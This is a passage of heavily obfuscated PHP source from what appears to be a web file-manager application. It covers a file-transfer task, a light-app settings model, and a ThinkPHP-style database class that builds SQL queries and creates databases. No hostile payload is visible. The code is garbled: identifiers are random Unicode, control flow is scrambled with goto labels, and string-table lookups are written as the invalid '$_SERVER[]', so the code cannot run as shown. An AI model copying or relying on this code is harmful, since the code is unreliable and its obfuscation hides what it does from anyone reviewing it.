"\x7b\151\157\x3a{$eǂ}\175\57"; $e = !0; $dĜ = array(); goto a; e۞Щ: if (!$e) { $a->stop($fޣ); return !1; } $a->end(); $this->remove($b는); goto Eذ; F؝: $F =& $_SERVER[]; $B䛬 = array($F[742] => $b는); $cÃ = Model($F[422])->where($B䛬)->count(); goto BҠ; BҠ: $c = Model($F[422])->where($B䛬)->sum($F[77]); $fޣ = $F[2398] . $b는; $a = new TaskFileTransfer($fޣ, $F[2399], $cÃ, LNG($F[2400]) . "\50{$b는}\x29"); goto Dѐޱ; Eذ: } public function progress($cӲ) { return Task::get($_SERVER[][2398] . $cӲ); } private function removeByFileID($CԆ = array()) { goto A船; A船: $e =& $_SERVER[]; if (empty($CԆ)) { return; } $D = array($e[419] => array($e[7], $CԆ)); goto AɅ㚛; Eʗ: foreach ($e䔿 as $A) { Model($e[382])->removeNow($A, !1); } goto Dߝ; AɅ㚛: $e䔿 = Model($e[1119])->where($D)->field($e[369])->select(); if (!$e䔿) { return; } $e䔿 = array_to_keyvalue($e䔿, $e[33], $e[369]); goto Eʗ; Dߝ: } private function removeShareItems($cז) { goto b; b: $bڄ =& $_SERVER[]; $bԇƒ = "\173\151\157\x3a{$cז}\175\57"; $e = array($bڄ[369] => 0, $bڄ[1021] => array($bڄ[750], "{$bԇƒ}\x25")); goto Bό; dރ: Model($bڄ[538])->remove($cŽޒ); goto dڇ嘱; Bό: $c᥹ͫ = Model($bڄ[2085])->where($e)->field($bڄ[441])->select(); if (empty($c᥹ͫ)) { return; } $cŽޒ = array_to_keyvalue($c᥹ͫ, $bڄ[33], $bڄ[441]); goto dރ; dڇ嘱: } } class SystemLightAppModel extends ModelBaseLight { public $optionType = "\x53\171\x73\164\145\155\x2e\114\x69\147\150\164\101\x70\x70"; public $modelType = "\x53\171\x73\x74\145\x6d\x4f\x70\x74\151\x6f\x6e"; public $field = array("\156\x61\155\x65", "\x67\162\x6f\165\160", "\x64\145\x73\143", "\x63\157\156\164\145\156\x74"); public function listData($B = false, $Dܲڎ = "\x6d\x6f\x64\151\146\x79\124\151\x6d\x65", $E֝ = true) { return parent::listData($B, $Dܲڎ, $E֝); } public function remove($FƩȎ) { $e摆࿞ = $this->findByName($FƩȎ); if (!$e摆࿞) { return !1; } return parent::remove($e摆࿞[$_SERVER[][367]]); } public function add($bϲ) { if ($this->findByName($bϲ[$_SERVER[][28]])) { return !1; } return parent::insert($bϲ); } public function update($A, $FيԬ) { $F =& $_SERVER[]; $D = $this->findByName($A); $fœ = $this->findByName($FيԬ[$F[28]]); if (!$D || $fœ && $fœ[$F[367]] != $D[$F[367]]) { return !1; } return parent::update($D[$F[367]], $FيԬ); } } goto a; D: class Db { protected $dbType = null; protected $autoFree = false; protected $model = "\x5f\164\x68\x69\156\153\x5f"; protected $pconnect = false; protected $queryStr = ''; protected $modelSql = array(); protected $lastInsID = null; protected $numRows = 0; protected $numCols = 0; protected $transTimes = 0; protected $error = ''; protected $linkID = array(); protected $_linkID = null; protected $queryID = null; protected $connected = false; protected $config = ''; protected $exp = array("\x65\x71" => "\x3d", "\156\145\x71" => "\74\76", "\147\164" => "\x3e", "\x65\147\x74" => "\76\75", "\x6c\164" => "\74", "\x65\x6c\164" => "\x3c\x3d", "\156\157\x74\154\x69\153\x65" => "\x4e\117\124\x20\114\111\113\105", "\x6c\151\153\145" => "\114\x49\x4b\105", "\x69\x6e" => "\x49\116", "\156\157\164\x69\x6e" => "\116\x4f\124\40\x49\x4e", "\x6e\x6f\164\40\x69\156" => "\116\x4f\124\x20\x49\116", "\x62\145\x74\167\145\145\x6e" => "\102\105\x54\127\x45\x45\116", "\x6e\157\x74\142\145\164\x77\145\145\x6e" => "\116\117\x54\40\102\x45\x54\x57\105\x45\x4e", "\156\x6f\164\x20\142\x65\x74\167\145\x65\156" => "\x4e\117\124\x20\102\105\x54\x57\105\x45\x4e"); protected $selectSql = "\x53\105\x4c\x45\103\124\45\104\111\123\124\111\116\x43\x54\45\x20\x25\x46\111\x45\114\x44\45\40\x46\x52\117\115\x20\45\x54\101\102\114\105\45\x25\112\117\111\x4e\x25\45\127\110\105\x52\105\x25\x25\x47\x52\x4f\x55\x50\x25\x25\x48\x41\126\111\116\107\45\x25\x4f\x52\104\105\x52\x25\x25\x4c\111\115\111\x54\x25\x20\x25\125\116\x49\x4f\116\45\x25\x43\117\x4d\x4d\105\x4e\x54\45"; protected $bind = array(); public static function getInstance() { $f = func_get_args(); return think_get_instance_of(__CLASS__, $_SERVER[][876], $f); } public function factory($cƒ = '') { goto D»; d៍: return $c; goto e؇µ֩; D»: $eǰ =& $_SERVER[]; $cƒ = $this->parseConfig($cƒ); if (empty($cƒ[$eǰ[877]])) { think_exception(think_lang($eǰ[878])); } goto AσÓ; AσÓ: $this->dbType = ucwords(strtolower($cƒ[$eǰ[877]])); $dĔ˷ = $eǰ[879] . $this->dbType; if (class_exists($dĔ˷)) { $c = new $dĔ˷($cƒ); if ($eǰ[722] != strtolower($cƒ[$eǰ[877]])) { $c->dbType = strtoupper($this->dbType); } else { $c->dbType = $this->_getDsnType($cƒ[$eǰ[829]]); } } else { think_exception(think_lang($eǰ[880]) . $eǰ[881] . $dĔ˷); } goto d៍; e؇µ֩: } public function __call($e危݉, $FΩ) { if (method_exists($this, $e危݉)) { return call_user_func_array(array($this, $e危݉), $FΩ); } } protected function _getDsnType($Bֱ) { $A = explode($_SERVER[][4], $Bֱ); $a = strtoupper(trim($A[0])); return $a; } private function parseConfig($D = '') { $D =& $_SERVER[]; if (!empty($D) && is_string($D)) { $D = $this->parseDSN($D); } elseif (is_array($D)) { $D = array_change_key_case($D); $D = array($D[877] => $D[$D[721]], $D[802] => $D[$D[882]], $D[803] => $D[$D[883]], $D[800] => $D[$D[884]], $D[801] => $D[$D[885]], $D[17] => $D[$D[886]], $D[829] => $D[$D[723]], $D[13] => isset($D[$D[887]]) ? $D[$D[887]] : array()); } elseif (empty($D)) { if (think_config($D[888]) && $D[722] != strtolower(think_config($D[889]))) { $D = $this->parseDSN(think_config($D[888])); } else { $D = array($D[877] => think_config($D[889]), $D[802] => think_config($D[890]), $D[803] => think_config($D[891]), $D[800] => think_config($D[892]), $D[801] => think_config($D[893]), $D[17] => think_config($D[234]), $D[829] => think_config($D[888]), $D[13] => think_config($D[894])); } } return $D; } protected function initConnect($Aȋ = true) { if (1 == think_config($_SERVER[][18])) { $this->_linkID = $this->multiConnect($Aȋ); } else { if (!$this->connected) { $this->_linkID = $this->connect(); } } } protected function multiConnect($dɄ = false) { $dÚǉ =& $_SERVER[]; static $c = array(); if (empty($c)) { foreach ($this->config as $aӑ => $C) { $c[$aӑ] = explode($dÚǉ[47], $C); } } if (think_config($dÚǉ[895])) { if ($dɄ) { $dۇ = floor(mt_rand(0, think_config($dÚǉ[896]) - 1)); } else { if (is_numeric(think_config($dÚǉ[897]))) { $dۇ = think_config($dÚǉ[897]); } else { $dۇ = floor(mt_rand(think_config($dÚǉ[896]), count($c[$dÚǉ[800]]) - 1)); } } } else { $dۇ = floor(mt_rand(0, count($c[$dÚǉ[800]]) - 1)); } $Bƌݺ = array($dÚǉ[802] => isset($c[$dÚǉ[802]][$dۇ]) ? $c[$dÚǉ[802]][$dۇ] : $c[$dÚǉ[802]][0], $dÚǉ[803] => isset($c[$dÚǉ[803]][$dۇ]) ? $c[$dÚǉ[803]][$dۇ] : $c[$dÚǉ[803]][0], $dÚǉ[800] => isset($c[$dÚǉ[800]][$dۇ]) ? $c[$dÚǉ[800]][$dۇ] : $c[$dÚǉ[800]][0], $dÚǉ[801] => isset($c[$dÚǉ[801]][$dۇ]) ? $c[$dÚǉ[801]][$dۇ] : $c[$dÚǉ[801]][0], $dÚǉ[17] => isset($c[$dÚǉ[17]][$dۇ]) ? $c[$dÚǉ[17]][$dۇ] : $c[$dÚǉ[17]][0], $dÚǉ[829] => isset($c[$dÚǉ[829]][$dۇ]) ? $c[$dÚǉ[829]][$dۇ] : $c[$dÚǉ[829]][0], $dÚǉ[13] => isset($c[$dÚǉ[13]][$dۇ]) ? $c[$dÚǉ[13]][$dۇ] : $c[$dÚǉ[13]][0]); return $this->connect($Bƌݺ, $dۇ); } public function parseDSN($Bص) { $c⨜렵 =& $_SERVER[]; if (empty($Bص)) { return !1; } $Eģ = parse_url($Bص); if ($Eģ[$c⨜렵[168]]) { $dՌ = array($c⨜렵[877] => $Eģ[$c⨜렵[168]], $c⨜렵[802] => isset($Eģ[$c⨜렵[537]]) ? $Eģ[$c⨜렵[537]] : $c⨜렵[33], $c⨜렵[803] => isset($Eģ[$c⨜렵[898]]) ? $Eģ[$c⨜렵[898]] : $c⨜렵[33], $c⨜렵[800] => isset($Eģ[$c⨜렵[169]]) ? $Eģ[$c⨜렵[169]] : $c⨜렵[33], $c⨜렵[801] => isset($Eģ[$c⨜렵[170]]) ? $Eģ[$c⨜렵[170]] : $c⨜렵[33], $c⨜렵[17] => isset($Eģ[$c⨜렵[75]]) ? substr($Eģ[$c⨜렵[75]], 1) : $c⨜렵[33]); } else { preg_match($c⨜렵[899], trim($Bص), $E̦); $dՌ = array($c⨜렵[877] => $E̦[1], $c⨜렵[802] => $E̦[2], $c⨜렵[803] => $E̦[3], $c⨜렵[800] => $E̦[4], $c⨜렵[801] => $E̦[5], $c⨜렵[17] => $E̦[6]); } $dՌ[$c⨜렵[829]] = $c⨜렵[33]; return $dՌ; } protected function debug() { $Fޅ =& $_SERVER[]; $this->modelSql[$this->model] = $this->queryStr; $this->model = $Fޅ[900]; if (think_config($Fޅ[901])) { think_status($Fޅ[902]); think_trace($this->queryStr . $Fޅ[903] . think_status($Fޅ[20], $Fޅ[902], 6) . $Fޅ[904], $Fޅ[33], $Fޅ[905]); } } protected function parseLock($Fﱈ = false) { $f昉Ț =& $_SERVER[]; if (!$Fﱈ) { return $f昉Ț[33]; } if ($f昉Ț[831] == $this->dbType) { return $f昉Ț[906]; } return $f昉Ț[907]; } protected function parseSet($D͑հ) { $c =& $_SERVER[]; foreach ($D͑հ as $Cڷ => $c) { if (is_array($c) && $c[285] == $c[0]) { $B[] = $this->parseKey($Cڷ) . $c[908] . $c[1]; } elseif (is_scalar($c) || is_null($c)) { $B[] = $this->parseKey($Cڷ) . $c[908] . $this->parseValue($c); } } return $c[909] . implode($c[47], $B); } protected function bindParam($Fʏ, $F) { $this->bind[$_SERVER[][4] . $Fʏ] = $F; } protected function parseBind($B흊) { $B흊 = array_merge($this->bind, $B흊); $this->bind = array(); return $B흊; } function parseKey(&$eך, $fߣٴ = true) { if ($fߣٴ) { $eך = $this->parseKeyCheck($eך); } return $eך; } function parseKeyCheck($A) { $b兏 =& $_SERVER[]; $A = trim($A); if (!preg_match($b兏[910], $A)) { think_exception($b兏[911] . $A); } return $A; } protected function parseValue($E) { $Dŋė =& $_SERVER[]; if (is_string($E)) { $E = $Dŋė[870] . $this->escapeString($E) . $Dŋė[870]; } elseif (isset($E[0]) && is_string($E[0]) && strtolower($E[0]) == $Dŋė[285]) { $E = $this->escapeString($E[1]); } elseif (is_array($E)) { $E = array_map(array($this, $Dŋė[871]), $E); } elseif (is_bool($E)) { $E = $E ? $Dŋė[83] : $Dŋė[470]; } elseif (is_null($E)) { $E = $Dŋė[99]; } return $E; } protected function parseField($Eܦ) { $f =& $_SERVER[]; if (is_string($Eܦ) && strpos($Eܦ, $f[47])) { $Eܦ = explode($f[47], $Eܦ); } if (is_array($Eܦ)) { $F音 = array(); foreach ($Eܦ as $dǰ => $C쳋) { if (!is_numeric($dǰ)) { $F音[] = $this->parseKey($dǰ) . $f[912] . $this->parseKey($C쳋); } else { $F音[] = $this->parseKey($C쳋); } } $Eǅ = implode($f[47], $F音); } elseif (is_string($Eܦ) && !empty($Eܦ)) { $Eǅ = $Eܦ; } else { $Eǅ = $f[176]; } return $Eǅ; } protected function parseTable($Fȉ) { $cߒ =& $_SERVER[]; if (is_array($Fȉ)) { $B = array(); foreach ($Fȉ as $c => $E݆ʱ) { if (!is_numeric($c)) { $B[] = $this->parseKey($c) . $cߒ[50] . $this->parseKey($E݆ʱ); } else { $B[] = $this->parseKey($c); } } $Fȉ = $B; } elseif (is_string($Fȉ)) { if (strstr($Fȉ, $cߒ[50])) { return $Fȉ; } $Fȉ = explode($cߒ[47], $Fȉ); array_walk($Fȉ, array($this, $cߒ[819])); } return $cߒ[913] . trim(implode($cߒ[914], $Fȉ), $cߒ[825]) . $cߒ[913]; } protected function parseWhere($E͈) { $fӐ =& $_SERVER[]; $D = $fӐ[33]; if (is_string($E͈)) { $D = $E͈; } else { $e𘜂 = isset($E͈[$fӐ[915]]) ? strtoupper($E͈[$fӐ[915]]) : $fӐ[33]; if (in_array($e𘜂, array($fӐ[916], $fӐ[917], $fӐ[918]))) { $e𘜂 = $fӐ[50] . $e𘜂 . $fӐ[50]; unset($E͈[$fӐ[915]]); } else { $e𘜂 = $fӐ[919]; } foreach ($E͈ as $C뇎 => $dٷړ) { $D .= $fӐ[265]; if (is_numeric($C뇎)) { $C뇎 = $fӐ[920]; } if (0 === strpos($C뇎, $fӐ[70])) { $D .= $this->parseThinkWhere($C뇎, $dٷړ); } else { if (!preg_match($fӐ[921], trim($C뇎))) { think_exception(think_lang($fӐ[922]) . $fӐ[4] . $C뇎); } $bם߻ = is_array($dٷړ) && isset($dٷړ[$fӐ[923]]); $C뇎 = trim($C뇎); if (strpos($C뇎, $fӐ[271])) { $f叨ظ = explode($fӐ[271], $C뇎); $Aڃͣ = array(); foreach ($f叨ظ as $Dḋ => $e˝ڙ) { $f㲗 = $bם߻ ? $dٷړ[$Dḋ] : $dٷړ; $Aڃͣ[] = $fӐ[248] . $this->parseWhereItem($this->parseKey($e˝ڙ), $f㲗) . $fӐ[818]; } $D .= implode($fӐ[924], $Aڃͣ); } elseif (strpos($C뇎, $fӐ[272])) { $f叨ظ = explode($fӐ[272], $C뇎); $Aڃͣ = array(); foreach ($f叨ظ as $Dḋ => $e˝ڙ) { $f㲗 = $bם߻ ? $dٷړ[$Dḋ] : $dٷړ; $Aڃͣ[] = $fӐ[248] . $this->parseWhereItem($this->parseKey($e˝ڙ), $f㲗) . $fӐ[818]; } $D .= implode($fӐ[919], $Aڃͣ); } else { $D .= $this->parseWhereItem($this->parseKey($C뇎), $dٷړ); } } $D .= $fӐ[266] . $e𘜂; } $D = substr($D, 0, -strlen($e𘜂)); } return empty($D) ? $fӐ[33] : $fӐ[925] . $D; } protected function parseWhereItem($AЌ, $C潷) { $Eэͨ =& $_SERVER[]; $d縤 = $Eэͨ[33]; if (is_array($C潷)) { if (is_string($C潷[0])) { $aúᘥ = strtolower($C潷[0]); if (in_array($C潷[0], array($Eэͨ[908], $Eэͨ[926], $Eэͨ[927], $Eэͨ[928], $Eэͨ[929], $Eэͨ[930]))) { $d縤 .= $AЌ . $Eэͨ[50] . $C潷[0] . $Eэͨ[50] . $this->parseValue($C潷[1]); } elseif (preg_match($Eэͨ[931], $C潷[0])) { $d縤 .= $AЌ . $Eэͨ[50] . $this->exp[$aúᘥ] . $Eэͨ[50] . $this->parseValue($C潷[1]); } elseif (preg_match($Eэͨ[932], $C潷[0])) { if (is_array($C潷[1])) { $a̹ = isset($C潷[2]) ? strtoupper($C潷[2]) : $Eэͨ[917]; if (in_array($a̹, array($Eэͨ[916], $Eэͨ[917], $Eэͨ[918]))) { $Dۈ = array(); foreach ($C潷[1] as $f) { $Dۈ[] = $AЌ . $Eэͨ[50] . $this->exp[$aúᘥ] . $Eэͨ[50] . $this->parseValue($f); } $d縤 .= $Eэͨ[248] . implode($Eэͨ[50] . $a̹ . $Eэͨ[50], $Dۈ) . $Eэͨ[818]; } } else { $d縤 .= $AЌ . $Eэͨ[50] . $this->exp[$aúᘥ] . $Eэͨ[50] . $this->parseValue($C潷[1]); } } elseif ($Eэͨ[285] == $aúᘥ) { $d縤 .= $Eэͨ[816] . $AЌ . $Eэͨ[50] . $C潷[1] . $Eэͨ[933]; } elseif (preg_match($Eэͨ[934], $C潷[0])) { if (isset($C潷[2]) && $Eэͨ[285] == $C潷[2]) { $d縤 .= $AЌ . $Eэͨ[50] . $this->exp[$aúᘥ] . $Eэͨ[50] . $C潷[1]; } else { if (is_string($C潷[1])) { $C潷[1] = explode($Eэͨ[47], $C潷[1]); } $e߮ = implode($Eэͨ[47], $this->parseValue($C潷[1])); $d縤 .= $AЌ . $Eэͨ[50] . $this->exp[$aúᘥ] . $Eэͨ[816] . $e߮ . $Eэͨ[818]; } } elseif (preg_match($Eэͨ[935], $C潷[0])) { $Bē = is_string($C潷[1]) ? explode($Eэͨ[47], $C潷[1]) : $C潷[1]; $d縤 .= $Eэͨ[816] . $AЌ . $Eэͨ[50] . $this->exp[$aúᘥ] . $Eэͨ[50] . $this->parseValue($Bē[0]) . $Eэͨ[919] . $this->parseValue($Bē[1]) . $Eэͨ[266]; } else { think_exception(think_lang($Eэͨ[922]) . $Eэͨ[4] . $C潷[0]); } } else { $a = count($C潷); $Bڗ = isset($C潷[$a - 1]) ? strtoupper($C潷[$a - 1]) : $Eэͨ[33]; if (in_array($Bڗ, array($Eэͨ[916], $Eэͨ[917], $Eэͨ[918]))) { $a = $a - 1; } else { $Bڗ = $Eэͨ[916]; } for ($D = 0; $D < $a; $D++) { $Bē = is_array($C潷[$D]) ? $C潷[$D][1] : $C潷[$D]; if ($Eэͨ[285] == strtolower($C潷[$D][0])) { $d縤 .= $Eэͨ[248] . $AЌ . $Eэͨ[50] . $Bē . $Eэͨ[933] . $Bڗ . $Eэͨ[50]; } else { $Dڽƴ = is_array($C潷[$D]) ? $this->exp[strtolower($C潷[$D][0])] : $Eэͨ[908]; if (!$Dڽƴ && is_array($C潷[$D]) && in_array($C潷[$D][0], array($Eэͨ[908], $Eэͨ[926], $Eэͨ[927], $Eэͨ[928], $Eэͨ[929], $Eэͨ[930]))) { $Dڽƴ = $C潷[$D][0]; } $d縤 .= $Eэͨ[248] . $AЌ . $Eэͨ[50] . $Dڽƴ . $Eэͨ[50] . $this->parseValue($Bē) . $Eэͨ[933] . $Bڗ . $Eэͨ[50]; } } $d縤 = substr($d縤, 0, -4); } } else { $d縤 .= $AЌ . $Eэͨ[936] . $this->parseValue($C潷); } return $d縤; } protected function parseThinkWhere($fԳ׭, $CޒŘ) { $D̋ =& $_SERVER[]; $B = $D̋[33]; switch ($fԳ׭) { case $D̋[339]: $B = $CޒŘ; break; case $D̋[920]: $B = is_string($CޒŘ) ? $CޒŘ : substr($this->parseWhere($CޒŘ), 6); break; case $D̋[937]: parse_str($CޒŘ, $cƂ); if (isset($cƂ[$D̋[915]])) { $eۘ = $D̋[50] . strtoupper($cƂ[$D̋[915]]) . $D̋[50]; unset($cƂ[$D̋[915]]); } else { $eۘ = $D̋[919]; } $Bΐٯ = array(); foreach ($cƂ as $d׵ => $F޽ŭ) { $Bΐٯ[] = $this->parseKey($d׵) . $D̋[936] . $this->parseValue($F޽ŭ); } $B = implode($eۘ, $Bΐٯ); break; } return $B; } protected function parseLimit($BԳĊ) { $bԩ =& $_SERVER[]; return !empty($BԳĊ) ? $bԩ[48] . $BԳĊ . $bԩ[50] : $bԩ[33]; } protected function parseJoin($e©) { $AՒ =& $_SERVER[]; $Fĕ = $AՒ[33]; if (!empty($e©)) { if (is_array($e©)) { foreach ($e© as $Aػ => $Eϭ) { if (!1 !== stripos($Eϭ, $AՒ[938])) { $Fĕ .= $AՒ[50] . $Eϭ; } else { $Fĕ .= $AՒ[939] . $Eϭ; } } } else { $Fĕ .= $AՒ[939] . $e©; } } $Fĕ = preg_replace($AՒ[940], think_config($AՒ[843]) . $AՒ[941], $Fĕ); return $Fĕ; } protected function parseOrder($aĈ) { $bĺĊ =& $_SERVER[]; if (is_array($aĈ)) { $E = array(); foreach ($aĈ as $Dܜ => $D͘) { if (is_numeric($Dܜ)) { $E[] = $this->parseKey($D͘); } else { $D͘ = in_array(strtoupper(trim($D͘)), array($bĺĊ[942], $bĺĊ[943])) ? $bĺĊ[50] . $D͘ : $bĺĊ[33]; if (preg_match($bĺĊ[944], $Dܜ)) { $E[] = $this->parseKey($Dܜ) . $D͘; } else { think_exception($bĺĊ[945] . $Dܜ); } } } $aĈ = implode($bĺĊ[47], $E); } return !empty($aĈ) ? $bĺĊ[946] . $aĈ : $bĺĊ[33]; } protected function parseGroup($c) { $B䞞 =& $_SERVER[]; return !empty($c) ? $B䞞[947] . $c : $B䞞[33]; } protected function parseHaving($bꆶ) { $B =& $_SERVER[]; return !empty($bꆶ) ? $B[948] . $bꆶ : $B[33]; } protected function parseComment($Aּ) { $d܈𴭯 =& $_SERVER[]; return !empty($Aּ) ? $d܈𴭯[949] . $Aּ . $d܈𴭯[950] : $d܈𴭯[33]; } protected function parseDistinct($a) { $b̶ =& $_SERVER[]; return !empty($a) ? $b̶[951] : $b̶[33]; } protected function parseUnion($fѿϾ) { $b͙ =& $_SERVER[]; if (empty($fѿϾ)) { return $b͙[33]; } if (isset($fѿϾ[$b͙[336]])) { $e = $b͙[952]; unset($fѿϾ[$b͙[336]]); } else { $e = $b͙[953]; } foreach ($fѿϾ as $EƇ) { $F䴚[] = $e . (is_array($EƇ) ? $this->buildSelectSql($EƇ) : $EƇ); } return implode($b͙[50], $F䴚); } public function insert($fݹ, $AҜ = array(), $aȺ = false) { goto Eꇐ; bٱε떿: foreach ($fݹ as $aìڄ => $a) { if (is_array($a) && $e렠[285] == $a[0]) { $D·బ[] = $this->parseKey($aìڄ); $d뵽޲[] = $a[1]; } elseif (is_scalar($a) || is_null($a)) { $D·బ[] = $this->parseKey($aìڄ); $d뵽޲[] = $this->parseValue($a); } } $D = ($aȺ ? $e렠[820] : $e렠[821]) . $e렠[822] . $this->parseTable($AҜ[$e렠[267]]) . $e렠[816] . implode($e렠[47], $D·బ) . $e렠[817] . implode($e렠[47], $d뵽޲) . $e렠[818]; $D .= $this->parseLock(isset($AҜ[$e렠[770]]) ? $AҜ[$e렠[770]] : !1); goto B; B: $D .= $this->parseComment(!empty($AҜ[$e렠[341]]) ? $AҜ[$e렠[341]] : $e렠[33]); return $this->execute($D, $this->parseBind(!empty($AҜ[$e렠[273]]) ? $AҜ[$e렠[273]] : array())); goto d눆; Eꇐ: $e렠 =& $_SERVER[]; $d뵽޲ = $D·బ = array(); $this->model = $AҜ[$e렠[269]]; goto bٱε떿; d눆: } public function selectInsert($E, $b􇺥, $E = array()) { goto aݬ; aӸ: array_walk($E, array($this, $Cݭ[819])); $eݒ = $Cݭ[954] . $this->parseTable($b􇺥) . $Cݭ[816] . implode($Cݭ[47], $E) . $Cݭ[933]; $eݒ .= $this->buildSelectSql($E); goto Dɪ; aݬ: $Cݭ =& $_SERVER[]; $this->model = $E[$Cݭ[269]]; if (is_string($E)) { $E = explode($Cݭ[47], $E); } goto aӸ; Dɪ: return $this->execute($eݒ, $this->parseBind(!empty($E[$Cݭ[273]]) ? $E[$Cݭ[273]] : array())); goto fī߇; fī߇: } public function update($FȖ, $Bٙ) { $E瞮ۯ =& $_SERVER[]; $this->model = $Bٙ[$E瞮ۯ[269]]; $Fֿ = $E瞮ۯ[955] . $this->parseTable($Bٙ[$E瞮ۯ[267]]) . $this->parseSet($FȖ) . $this->parseWhere(!empty($Bٙ[$E瞮ۯ[263]]) ? $Bٙ[$E瞮ۯ[263]] : $E瞮ۯ[33]) . $this->parseOrder(!empty($Bٙ[$E瞮ۯ[350]]) ? $Bٙ[$E瞮ۯ[350]] : $E瞮ۯ[33]) . $this->parseLimit(!empty($Bٙ[$E瞮ۯ[280]]) ? $Bٙ[$E瞮ۯ[280]] : $E瞮ۯ[33]) . $this->parseLock(isset($Bٙ[$E瞮ۯ[770]]) ? $Bٙ[$E瞮ۯ[770]] : !1) . $this->parseComment(!empty($Bٙ[$E瞮ۯ[341]]) ? $Bٙ[$E瞮ۯ[341]] : $E瞮ۯ[33]); return $this->execute($Fֿ, $this->parseBind(!empty($Bٙ[$E瞮ۯ[273]]) ? $Bٙ[$E瞮ۯ[273]] : array())); } public function delete($e֤ = array()) { $c =& $_SERVER[]; $this->model = $e֤[$c[269]]; $Fؐì = $c[956] . $this->parseTable($e֤[$c[267]]) . $this->parseWhere(!empty($e֤[$c[263]]) ? $e֤[$c[263]] : $c[33]) . $this->parseOrder(!empty($e֤[$c[350]]) ? $e֤[$c[350]] : $c[33]) . $this->parseLimit(!empty($e֤[$c[280]]) ? $e֤[$c[280]] : $c[33]) . $this->parseLock(isset($e֤[$c[770]]) ? $e֤[$c[770]] : !1) . $this->parseComment(!empty($e֤[$c[341]]) ? $e֤[$c[341]] : $c[33]); return $this->execute($Fؐì, $this->parseBind(!empty($e֤[$c[273]]) ? $e֤[$c[273]] : array())); } public function select($FĞτ = array()) { goto C; C: $cՃ =& $_SERVER[]; $this->model = $FĞτ[$cՃ[269]]; $B = $this->buildSelectSql($FĞτ); goto eѹู; eѹู: $fѯר = isset($FĞτ[$cՃ[337]]) ? $FĞτ[$cՃ[337]] : !1; if ($fѯר) { $Dْ = is_string($fѯר[$cՃ[89]]) ? $fѯר[$cՃ[89]] : $cՃ[957] . md5($B); $Aێ = think_cache($Dْ, $cՃ[33], $fѯר); if (!1 !== $Aێ) { return $Aێ; } } $C䈨 = $this->query($B, $this->parseBind(!empty($FĞτ[$cՃ[273]]) ? $FĞτ[$cՃ[273]] : array())); goto fľ; fľ: if ($fѯר && !1 !== $C䈨) { think_cache($Dْ, $C䈨, $fѯר); } return $C䈨; goto f; f: } public function buildSelectSql($B = array()) { goto E䲰; dϖϺ: return $e; goto d; E䲰: $f܉ =& $_SERVER[]; if (isset($B[$f܉[340]])) { if (strpos($B[$f܉[340]], $f܉[47])) { list($Dʮ, $FگϾ) = explode($f܉[47], $B[$f܉[340]]); } else { $Dʮ = $B[$f܉[340]]; } $Dʮ = $Dʮ ? $Dʮ : 1; $FگϾ = isset($FگϾ) ? $FگϾ : (is_numeric($B[$f܉[280]]) ? $B[$f܉[280]] : 20); $A꿔 = $FگϾ * ((int) $Dʮ - 1); $B[$f܉[280]] = $A꿔 . $f܉[47] . $FگϾ; } if (think_config($f܉[958])) { $A = $f܉[959] . md5(serialize($B)); $F地 = think_cache($A); if ($F地) { return $F地; } } goto B󓦻; B󓦻: $e = $this->parseSql($this->selectSql, $B); $e .= $this->parseLock(isset($B[$f܉[770]]) ? $B[$f܉[770]] : !1); if (isset($A)) { think_cache($A, $e); } goto dϖϺ; d: } public function parseSql($D, $C֦ = array()) { $Aԧ𽬹 =& $_SERVER[]; $D = str_replace(array($Aԧ𽬹[960], $Aԧ𽬹[961], $Aԧ𽬹[962], $Aԧ𽬹[963], $Aԧ𽬹[964], $Aԧ𽬹[965], $Aԧ𽬹[966], $Aԧ𽬹[967], $Aԧ𽬹[968], $Aԧ𽬹[969], $Aԧ𽬹[970]), array($this->parseTable("{$C֦[$Aԧ𽬹[267]]}"), $this->parseDistinct(isset($C֦[$Aԧ𽬹[971]]) ? $C֦[$Aԧ𽬹[971]] : !1), $this->parseField(!empty($C֦[$Aԧ𽬹[261]]) ? $C֦[$Aԧ𽬹[261]] : $Aԧ𽬹[176]), $this->parseJoin(!empty($C֦[$Aԧ𽬹[270]]) ? $C֦[$Aԧ𽬹[270]] : $Aԧ𽬹[33]), $this->parseWhere(!empty($C֦[$Aԧ𽬹[263]]) ? $C֦[$Aԧ𽬹[263]] : $Aԧ𽬹[33]), $this->parseGroup(!empty($C֦[$Aԧ𽬹[972]]) ? $C֦[$Aԧ𽬹[972]] : $Aԧ𽬹[33]), $this->parseHaving(!empty($C֦[$Aԧ𽬹[973]]) ? $C֦[$Aԧ𽬹[973]] : $Aԧ𽬹[33]), $this->parseOrder(!empty($C֦[$Aԧ𽬹[350]]) ? $C֦[$Aԧ𽬹[350]] : $Aԧ𽬹[33]), $this->parseLimit(!empty($C֦[$Aԧ𽬹[280]]) ? $C֦[$Aԧ𽬹[280]] : $Aԧ𽬹[33]), $this->parseUnion(!empty($C֦[$Aԧ𽬹[335]]) ? $C֦[$Aԧ𽬹[335]] : $Aԧ𽬹[33]), $this->parseComment(!empty($C֦[$Aԧ𽬹[341]]) ? $C֦[$Aԧ𽬹[341]] : $Aԧ𽬹[33])), $D); return $D; } public function getLastSql($Cڝ͹ = '') { return $Cڝ͹ ? $this->modelSql[$Cڝ͹] : $this->queryStr; } public function getLastInsID() { return $this->lastInsID; } public function getError() { return $this->error; } public function escapeString($d) { return addslashes($d); } public function setModel($C𝐻) { $this->model = $C𝐻; } public function getDbType() { return $this->dbType; } public function __destruct() { if ($this->queryID) { $this->free(); } $this->close(); } public function close() { } } class DbManage { function __construct($E, $AɅ = '') { $this->database = $E; $this->type = $AɅ; } public function model($Cۊϼ = '') { return new ModelBase($Cۊϼ, $_SERVER[][33], $this->database); } public function db($cۓӘ = false) { goto Dލ; f: if (!$fڈ) { $B鍈->execute("\143\x72\x65\141\x74\145\x20\x64\x61\164\x61\x62\x61\163\145\40\x60{$fƤ}\x60"); } $Bጵ[$F[886]] = $fƤ; if ($Bጵ[$F[721]] == $F[722]) { $Bጵ[$F[723]] .= $F[974] . $fƤ; } goto b; B枇: $fƤ = $Bጵ[$F[886]]; $Bጵ[$F[886]] = $F[33]; if ($Bጵ[$F[721]] == $F[722]) { $a = $Bጵ[$F[723]]; $Bጵ[$F[723]] = substr($a, 0, strrpos($a, $F[974])); } goto D; b: $this->database = $Bጵ; $B鍈->execute("\165\x73\x65\x20\x60{$fƤ}\140"); return $B鍈; goto aѝ; Dލ: $F =& $_SERVER[]; $Bጵ = array_change_key_case($this->database); if ($this->type == $F[9] || !$cۓӘ) { return $this->model()->db(); } goto B枇; D: $this->database = $Bጵ; $B鍈 = $this->model()->db(); try { $fڈ = 